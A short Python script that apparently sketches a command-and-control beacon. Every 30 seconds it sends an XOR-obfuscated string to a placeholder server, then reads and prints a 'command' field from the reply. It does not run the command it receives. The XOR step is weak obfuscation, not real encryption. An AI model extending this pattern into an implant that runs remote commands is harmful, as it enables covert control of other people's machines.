import time
import requests

def xor_encrypt(message, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(message))

while True:
    response = requests.post('https://example.invalid/', data=xor_encrypt('profile', 'key'))
    response_data = response.json()
    command = response_data.get('command', '')
    print(command)
    time.sleep(30)
